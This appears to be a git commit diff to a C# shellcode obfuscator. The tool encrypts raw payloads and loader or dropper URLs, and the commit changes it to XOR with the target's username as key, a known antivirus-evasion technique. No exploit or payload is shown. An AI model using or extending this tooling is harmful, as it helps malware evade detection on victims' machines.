036f025a2860a3c38df365426752f96df53c50ba
Soumyani1 <soumyanilbiswas2018@gmail.com>
2022-07-04 02:54:29 +0530

    Update encrypt.cs

--- obfuscator/encrypt.cs
+++ obfuscator/encrypt.cs
@@ -7,7 +7,7 @@ using System;
 using System.IO;			// StreamReader, MemoryStream
 using System.Text;
 using System.Collections.Generic;
-using System.Security.Cryptography;
+//using System.Security.Cryptography;
 using System.Diagnostics;
 
 
@@ -67,17 +67,18 @@ class Program
 		Console.WriteLine("{0}", xor_b64);
 	}
 
+	/*
 	// AES Encryption:
 	public static byte[] AES_Encrypt(byte[] cipher, byte[] saltBytes, byte[] passwordBytes)
 	{
-		/*
-		SymmetricAlgorithm algorithm = Aes.Create();
-		ICryptoTransform transform = algorithm.CreateEncryptor(passwordBytes, saltBytes);
 		
-		byte[] outputBuffer = transform.TransformFinalBlock(cipher, 0, cipher.Length);    // byte -> byte
+		//SymmetricAlgorithm algorithm = Aes.Create();
+		//ICryptoTransform transform = algorithm.CreateEncryptor(passwordBytes, saltBytes);
+		
+		//byte[] outputBuffer = transform.TransformFinalBlock(cipher, 0, cipher.Length);    // byte -> byte
 
-		return outputBuffer;
-		*/
+		//return outputBuffer;
+		
 		passwordBytes = SHA256.Create().ComputeHash(passwordBytes);
 
 		byte[] encryptedBytes = null;
@@ -104,11 +105,11 @@ class Program
 			}
 		}
 
-		/*
-		Console.WriteLine("\nAES Encrypted: ");
-		Console.WriteLine("-----------------\n");
-		PasteShellcode(encryptedBytes);
-		*/
+		
+		//Console.WriteLine("\nAES Encrypted: ");
+		//Console.WriteLine("-----------------\n");
+		//PasteShellcode(encryptedBytes);
+		
 		return encryptedBytes;
 	}
 
@@ -122,7 +123,7 @@ class Program
 		Console.WriteLine("\n{0}", aes_b64);
 	}
 
-	/*
+
 	// Encryption: AES -> XOR
 	// Convertion: input (unencrypted) byte -aes-> aes_byte -xor-> aes_xor_byte
 	public static byte[] AES_XOR_Encrypt(byte[] cipher, byte[] saltBytes, byte[] passwordBytes)
@@ -196,7 +197,7 @@ class Program
 		Console.WriteLine("\n");
 	}
 
-	public static void Choosing_Encryption(string output, byte[] rawshellcode, byte[] saltBytes, byte[] passwordBytes)
+	public static void Choosing_Encryption(string output, byte[] rawshellcode)
 	{
 		switch (output)
 		{
@@ -226,7 +227,7 @@ class Program
 				// Convertion: input byte -aes-> aes_byte -xor-> aes_xor_byte
 				aes_xor_encrypted = AES_XOR_Encrypt(rawshellcode, saltBytes, passwordBytes);
 				break;
-			*/
+
 			case "aes_b64":
 				Console.WriteLine("\n=============================");
 				Console.WriteLine("[+] (AES -> b64)'ed Output: ");
@@ -234,7 +235,7 @@ class Program
 				// Convertion: input byte -aes-> aes_byte -xor-> aes_xor_byte -b64-> aes_xor_b64_byte
 				AES_B64_Encrypt(rawshellcode, saltBytes, passwordBytes);
 				break;
-
+			*/
 			default:
 				// If wrong options inputed
 				Console.WriteLine("\n[!] Please input encryption algorithm");
@@ -252,31 +253,31 @@ class Program
 		//Console.WriteLine("1. encrypt.exe /file:file.bin /out:xor_b64");
 		//Console.WriteLine("3. encrypt.exe /file:file.bin /out:aes");
 		//Console.WriteLine("4. encrypt.exe /file:file.bin /out:aes_xor");
-		Console.WriteLine("1. encrypt.exe /file:file.bin /out:aes_b64");
+		Console.WriteLine("1. encrypt.exe /file:file.bin /xor_key:<usernameoftarget> /out:xor_b64");
 
 		//Console.WriteLine("1. encrypt.exe /shellcodeurl:<url> /out:xor");
 		//Console.WriteLine("1. encrypt.exe /shellcodeurl:<url> /out:xor_b64");
 		//Console.WriteLine("3. encrypt.exe /shellcodeurl:<url> /out:aes");
 		//Console.WriteLine("4. encrypt.exe /shellcodeurl:<url> /out:aes_xor");
-		Console.WriteLine("2. encrypt.exe /shellcodeurl:<url> /out:aes_b64");
+		Console.WriteLine("2. encrypt.exe /shellcodeurl:<url> /xor_key:<usernameoftarget> /out:xor_b64");
 
 		//Console.WriteLine("1. encrypt.exe /mscorliburl:<url> /out:xor");
 		//Console.WriteLine("1. encrypt.exe /mscorliburl:<url> /out:xor_b64");
 		//Console.WriteLine("3. encrypt.exe /mscorliburl:<url> /out:aes");
 		//Console.WriteLine("4. encrypt.exe /mscorliburl:<url> /out:aes_xor");
-		Console.WriteLine("3. encrypt.exe /mscorliburl:<url> /out:aes_b64");
+		Console.WriteLine("3. encrypt.exe /mscorliburl:<url> /xor_key:<usernameoftarget> /out:xor_b64");
 
 		//Console.WriteLine("1. encrypt.exe /remotewriteurl:<url> /out:xor");
 		//Console.WriteLine("1. encrypt.exe /remotewriteurl:<url> /out:xor_b64");
 		//Console.WriteLine("3. encrypt.exe /remotewriteurl:<url> /out:aes");
 		//Console.WriteLine("4. encrypt.exe /remotewriteurl:<url> /out:aes_xor");
-		Console.WriteLine("4. encrypt.exe /remotewriteurl:<url> /out:aes_b64");
+		Console.WriteLine("4. encrypt.exe /remotewriteurl:<url> /xor_key:<usernameoftarget> /out:xor_b64");
 
 		//Console.WriteLine("1. encrypt.exe /remotereadurl:<url> /out:xor");
 		//Console.WriteLine("1. encrypt.exe /remotereadurl:<url> /out:xor_b64");
 		//Console.WriteLine("3. encrypt.exe /remotereadurl:<url> /out:aes");
 		//Console.WriteLine("4. encrypt.exe /remotereadurl:<url> /out:aes_xor");
-		Console.WriteLine("5. encrypt.exe /remotereadurl:<url> /out:aes_b64");
+		Console.WriteLine("5. encrypt.exe /remotereadurl:<url> /xor_key:<usernameoftarget> /out:xor_b64");
 
 		//Console.WriteLine("1. encrypt.exe /string:<string> /out:xor");
 		//Console.WriteLine("1. encrypt.exe /string:<string> /out:xor_b64");
@@ -317,22 +318,52 @@ class Program
 				if(arguments.ContainsKey("/file"))
 				{
 					last_3_chars = arguments["/file"].Substring(arguments["/file"].Length-3);
+
+					if(arguments.ContainsKey("/xor_key"))
+					{
+						string xorKey = arguments["/xor_key"];
+						xor_key_byte = Encoding.UTF8.GetBytes(xorKey);
+					}
 				}
 				else if(arguments.ContainsKey("/shellcodeurl"))
 				{
 					last_3_chars = arguments["/shellcodeurl"].Substring(arguments["/shellcodeurl"].Length-3);
+
+					if(arguments.ContainsKey("/xor_key"))
+					{
+						string xorKey = arguments["/xor_key"];
+						xor_key_byte = Encoding.UTF8.GetBytes(xorKey);
+					}
 				}
 				else if(arguments.ContainsKey("/mscorliburl"))
 				{
 					last_3_chars = arguments["/mscorliburl"].Substring(arguments["/mscorliburl"].Length-3);
+
+					if(arguments.ContainsKey("/xor_key"))
+					{
+						string xorKey = arguments["/xor_key"];
+						xor_key_byte = Encoding.UTF8.GetBytes(xorKey);
+					}
 				}
 				else if(arguments.ContainsKey("/remotewriteurl"))
 				{
 					last_3_chars = arguments["/remotewriteurl"].Substring(arguments["/remotewriteurl"].Length-3);
+
+					if(arguments.ContainsKey("/xor_key"))
+					{
+						string xorKey = arguments["/xor_key"];
+						xor_key_byte = Encoding.UTF8.GetBytes(xorKey);
+					}
 				}
 				else if(arguments.ContainsKey("/remotereadurl"))
 				{
 					last_3_chars = arguments["/remotereadurl"].Substring(arguments["/remotereadurl"].Length-3);
+
+					if(arguments.ContainsKey("/xor_key"))
+					{
+						string xorKey = arguments["/xor_key"];
+						xor_key_byte = Encoding.UTF8.GetBytes(xorKey);
+					}
 				}
 				else if(arguments.ContainsKey("/string"))
 				{
@@ -398,102 +429,97 @@ class Program
 		// 1st url call: By Loader
 		else if(arguments.ContainsKey("/mscorliburl"))
 		{
-			string urlPath = arguments["/mscorliburl"];
+			if(arguments.ContainsKey("/xor_key"))
+			{
+				Console.Write("\n");
+				string urlPath = arguments["/mscorliburl"];
 
-			byte[] urlPath_bytes = Encoding.UTF8.GetBytes(urlPath);
+				byte[] urlPath_bytes = Encoding.UTF8.GetBytes(urlPath);
 
-			// Only For AES Encryption (if required):
-			// salt and password for url:
-			byte[] url_saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };         // AES iv       // change
-			byte[] url_passwordBytes = Encoding.UTF8.GetBytes("word1");                 // AES key      // change
-
-			Choosing_Encryption(arguments["/out"].ToLower(), urlPath_bytes, url_saltBytes, url_passwordBytes);
+				Choosing_Encryption(arguments["/out"].ToLower(), urlPath_bytes);
+			}
 		}
 		// 2nd url call: By Loader
 		else if(arguments.ContainsKey("/remotewriteurl"))
 		{
-			string urlPath = arguments["/remotewriteurl"];
+			if(arguments.ContainsKey("/xor_key"))
+			{
+				Console.Write("\n");
+				string urlPath = arguments["/remotewriteurl"];
 
-			byte[] urlPath_bytes = Encoding.UTF8.GetBytes(urlPath);
+				byte[] urlPath_bytes = Encoding.UTF8.GetBytes(urlPath);
 
-			// Only For AES Encryption (if required):
-			// salt and password for url:
-			byte[] url_saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8, 9 };         // AES iv       // change
-			byte[] url_passwordBytes = Encoding.UTF8.GetBytes("word2");                         // AES key      // change
-
-			Choosing_Encryption(arguments["/out"].ToLower(), urlPath_bytes, url_saltBytes, url_passwordBytes);
+				Choosing_Encryption(arguments["/out"].ToLower(), urlPath_bytes);
+			}
 		}
 		// 3rd url call: By Loader
 		else if(arguments.ContainsKey("/remotereadurl"))
 		{
-			string urlPath = arguments["/remotereadurl"];
+			if(arguments.ContainsKey("/xor_key"))
+			{
+				Console.Write("\n");
+				string urlPath = arguments["/remotereadurl"];
 
-			byte[] urlPath_bytes = Encoding.UTF8.GetBytes(urlPath);
+				byte[] urlPath_bytes = Encoding.UTF8.GetBytes(urlPath);
 
-			// Only For AES Encryption (if required):
-			// salt and password for url:
-			byte[] url_saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 };         // AES iv       // change
-			byte[] url_passwordBytes = Encoding.UTF8.GetBytes("word3");                         // AES key      // change
-
-			Choosing_Encryption(arguments["/out"].ToLower(), urlPath_bytes, url_saltBytes, url_passwordBytes);
+				Choosing_Encryption(arguments["/out"].ToLower(), urlPath_bytes);
+			}				
 		}
 		// Last url call: By Dropper
 		else if(arguments.ContainsKey("/shellcodeurl"))
 		{
-			string urlPath = arguments["/shellcodeurl"];
+			if(arguments.ContainsKey("/xor_key"))
+			{
+				Console.Write("\n");
+				string urlPath = arguments["/shellcodeurl"];
 
-			byte[] urlPath_bytes = Encoding.UTF8.GetBytes(urlPath);
+				byte[] urlPath_bytes = Encoding.UTF8.GetBytes(urlPath);
 
-			// Only For AES Encryption (if required):
-			// salt and password for url:
-			byte[] url_saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11 };         // AES iv       // change
-			byte[] url_passwordBytes = Encoding.UTF8.GetBytes("word4");              // AES key      // change
-
-			Choosing_Encryption(arguments["/out"].ToLower(), urlPath_bytes, url_saltBytes, url_passwordBytes);
+				Choosing_Encryption(arguments["/out"].ToLower(), urlPath_bytes);
+			}
 		}
 		// If it is shellcode
 		else if(arguments.ContainsKey("/file"))
 		{
-			//Console.WriteLine("HERE: 90");
-			var filePath = arguments["/file"];
-
-			Console.WriteLine("[+] filePath: {0}", filePath);
-
-			if (!File.Exists(filePath)) //if file exists
-			{   
-				Console.WriteLine("\n[+] Missing input file or probably inputed 'urlPath' instead of 'filePath' ");
-				Environment.Exit(0);
-			}
-			else
+			if(arguments.ContainsKey("/xor_key"))
 			{
-				try
-				{
-					if(IsBinary(filePath))
-					{
-						Console.WriteLine("[+] Input file has '.{0}' extension	=>	Raw payload detected!", last_3_chars);
-						byte[] rawshellcode = File.ReadAllBytes(filePath);
+				Console.Write("\n");
+				
+				var filePath = arguments["/file"];
 
-						Console.WriteLine("\n==================");
-						Console.WriteLine("Rawshellcode: ");
-						Console.WriteLine("==================");
-						PasteToConsole(rawshellcode);
+				Console.WriteLine("[+] filePath: {0}", filePath);
 
-						// Only For AES Encryption (if required):
-						// salt and password for shellcode:
-						byte[] shellcode_saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12 };         // AES iv       // change
-						byte[] shellcode_passwordBytes = Encoding.UTF8.GetBytes("pass");            // AES key      // change
-
-						Choosing_Encryption(arguments["/out"].ToLower(), rawshellcode, shellcode_saltBytes, shellcode_passwordBytes);
-					}
-					else
-					{
-						Console.WriteLine("[!] Couldn't detect file input content.");
-						Environment.Exit(0);
-					}
+				if (!File.Exists(filePath)) //if file exists
+				{   
+					Console.WriteLine("\n[+] Missing input file or probably inputed 'urlPath' instead of 'filePath' ");
+					Environment.Exit(0);
 				}
-				catch
+				else
 				{
-					Console.WriteLine("[!] Error encrypting");
+					try
+					{
+						if(IsBinary(filePath))
+						{
+							Console.WriteLine("[+] Input file has '.{0}' extension	=>	Raw payload detected!", last_3_chars);
+							byte[] rawshellcode = File.ReadAllBytes(filePath);
+
+							Console.WriteLine("\n==================");
+							Console.WriteLine("Rawshellcode: ");
+							Console.WriteLine("==================");
+							PasteToConsole(rawshellcode);
+
+							Choosing_Encryption(arguments["/out"].ToLower(), rawshellcode);
+						}
+						else
+						{
+							Console.WriteLine("[!] Couldn't detect file input content.");
+							Environment.Exit(0);
+						}
+					}
+					catch
+					{
+						Console.WriteLine("[!] Error encrypting");
+					}
 				}
 			}
 		}
